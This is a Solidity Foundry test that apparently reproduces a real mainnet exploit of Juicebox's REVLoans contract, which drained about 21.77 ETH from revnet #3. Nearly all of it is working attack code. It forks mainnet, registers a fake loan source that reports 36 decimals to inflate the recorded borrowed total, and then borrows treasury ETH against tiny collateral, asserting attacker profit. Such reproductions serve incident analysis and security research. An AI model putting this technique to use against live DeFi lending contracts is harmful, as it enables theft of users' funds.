// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "../basetest.sol";

// @KeyInfo - Total Lost : 21.77 ETH
// Attacker : 0x23245f620d1e910Ad76E6B6dE4F8284A53C9aD2d
// Attack Contract : EOA direct call; fake source deployed by attacker
// Vulnerable Contract : 0x1880D832aa283d05b8eAB68877717E25FbD550Bb
// Victim : Juicebox revnet #3 treasury in JBMultiTerminal
// Attack Tx : https://etherscan.io/tx/0x9adbd62355eb72b4ff6c58716a503133672ed9317ab930a4c6aa31c7a1a8f938

// @Info
// Vulnerable Contract Code : https://etherscan.io/address/0x1880D832aa283d05b8eAB68877717E25FbD550Bb#code

// @Analysis
// Twitter Guy : https://x.com/DefimonAlerts/status/2046862935650345139
//
// REVLoans registers the caller-supplied loan source the first time borrowFrom() uses it.
// A fake terminal/token can therefore inflate totalBorrowedFrom without paying real assets.
// After registering the fake source, the attacker borrows native ETH from JBMultiTerminal
// with tiny revnet-token collateral and receives the drained treasury ETH.

address constant ATTACKER = 0x23245F620d1e910ad76e6B6De4f8284A53C9Ad2d;
address constant REV_LOANS = 0x1880D832aa283d05b8eAB68877717E25FbD550Bb;
address constant JB_MULTI_TERMINAL = 0x2dB6d704058E552DeFE415753465df8dF0361846;
address constant JB_PERMISSIONS = 0x04fD6913d6c32D8C216e153a43C04b1857a7793d;
address constant NATIVE_TOKEN = 0x000000000000000000000000000000000000EEEe;

uint256 constant REVNET_ID = 3;
uint256 constant PREPAID_FEE_PERCENT = 25;
uint32 constant ETH_CURRENCY = 61_166;
uint8 constant BURN_PERMISSION_ID = 10;

struct REVLoanSource {
    address token;
    address terminal;
}

struct JBPermissionsData {
    address operator;
    uint64 projectId;
    uint8[] permissionIds;
}

struct JBAccountingContext {
    address token;
    uint8 decimals;
    uint32 currency;
}

interface IREVLoans {
    function borrowFrom(
        uint256 revnetId,
        REVLoanSource calldata source,
        uint256 minBorrowAmount,
        uint256 collateralCount,
        address payable beneficiary,
        uint256 prepaidFeePercent
    ) external;

    function totalBorrowedFrom(
        uint256 revnetId,
        address terminal,
        address token
    ) external view returns (uint256);
}

interface IJBMultiTerminal {
    function pay(
        uint256 projectId,
        address token,
        uint256 amount,
        address beneficiary,
        uint256 minReturnedTokens,
        string calldata memo,
        bytes calldata metadata
    ) external payable returns (uint256 beneficiaryTokenCount);
}

interface IJBPermissions {
    function setPermissionsFor(
        address account,
        JBPermissionsData calldata permissionsData
    ) external;
}

contract ContractTest is BaseTestWithBalanceLog {
    IREVLoans private constant loans = IREVLoans(REV_LOANS);
    IJBMultiTerminal private constant terminal = IJBMultiTerminal(JB_MULTI_TERMINAL);
    IJBPermissions private constant permissions = IJBPermissions(JB_PERMISSIONS);

    FakeLoanSourceTerminal private fakeSource;

    function setUp() public {
        uint256 forkBlock = 24_917_718;
        vm.createSelectFork("mainnet", forkBlock);
        fakeSource = new FakeLoanSourceTerminal();

        vm.label(ATTACKER, "Attacker");
        vm.label(REV_LOANS, "REVLoans");
        vm.label(JB_MULTI_TERMINAL, "JBMultiTerminal");
        vm.label(JB_PERMISSIONS, "JBPermissions");
        vm.label(address(fakeSource), "LocalFakeLoanSource");
    }

    function testExploit() public {
        uint256 seedAmount = 1 ether;
        uint256 projectTokenPayment = 0.0001 ether;
        vm.deal(ATTACKER, seedAmount);

        uint256 attackerBefore = ATTACKER.balance;

        vm.startPrank(ATTACKER);

        // step 1: obtain enough revnet #3 project tokens to post tiny collateral.
        terminal.pay{value: projectTokenPayment}({
            projectId: REVNET_ID,
            token: NATIVE_TOKEN,
            amount: projectTokenPayment,
            beneficiary: ATTACKER,
            minReturnedTokens: 0,
            memo: "",
            metadata: ""
        });

        // step 2: allow REVLoans to burn the attacker's revnet #3 tokens as loan collateral.
        uint8[] memory permissionIds = new uint8[](1);
        permissionIds[0] = BURN_PERMISSION_ID;
        permissions.setPermissionsFor({
            account: ATTACKER,
            permissionsData: JBPermissionsData({
                operator: REV_LOANS, projectId: uint64(REVNET_ID), permissionIds: permissionIds
            })
        });

        // step 3: register a fake source by opening a fake-token loan.
        uint256 fakeSourceCollateral = 22_903_320_800_000_000;
        loans.borrowFrom({
            revnetId: REVNET_ID,
            source: REVLoanSource({token: address(fakeSource), terminal: address(fakeSource)}),
            minBorrowAmount: 0,
            collateralCount: fakeSourceCollateral,
            beneficiary: payable(ATTACKER),
            prepaidFeePercent: PREPAID_FEE_PERCENT
        });
        assertGt(
            loans.totalBorrowedFrom(REVNET_ID, address(fakeSource), address(fakeSource)),
            0,
            "fake source was not registered"
        );

        // step 4: borrow native ETH from the real terminal using the inflated borrowed total.
        uint256 nativeCollateral = 65_301_882_816_341;
        loans.borrowFrom({
            revnetId: REVNET_ID,
            source: REVLoanSource({token: NATIVE_TOKEN, terminal: JB_MULTI_TERMINAL}),
            minBorrowAmount: 0,
            collateralCount: nativeCollateral,
            beneficiary: payable(ATTACKER),
            prepaidFeePercent: PREPAID_FEE_PERCENT
        });

        vm.stopPrank();

        uint256 profit = ATTACKER.balance - attackerBefore;
        emit log_named_decimal_uint("Attacker ETH profit", profit, 18);
        assertGt(profit, 21 ether, "attacker profit too low");
    }
}

contract FakeLoanSourceTerminal {
    function accountingContextForTokenOf(
        uint256,
        address token
    ) external pure returns (JBAccountingContext memory context) {
        // The historical fake source reported 36 decimals, inflating the recorded fake borrow by 1e18.
        context = JBAccountingContext({token: token, decimals: 36, currency: ETH_CURRENCY});
    }

    function useAllowanceOf(
        uint256,
        address,
        uint256 amount,
        uint256,
        uint256,
        address payable,
        address,
        string calldata
    ) external pure returns (uint256) {
        return amount;
    }

    function transfer(
        address,
        uint256
    ) external pure returns (bool) {
        return true;
    }

    function decimals() external pure returns (uint8) {
        return 36;
    }

    function allowance(
        address,
        address
    ) external pure returns (uint256) {
        return 0;
    }

    function approve(
        address,
        uint256
    ) external pure returns (bool) {
        return true;
    }

    function pay(
        uint256,
        address,
        uint256,
        address,
        uint256,
        string calldata,
        bytes calldata
    ) external payable returns (uint256) {
        return 0;
    }
}
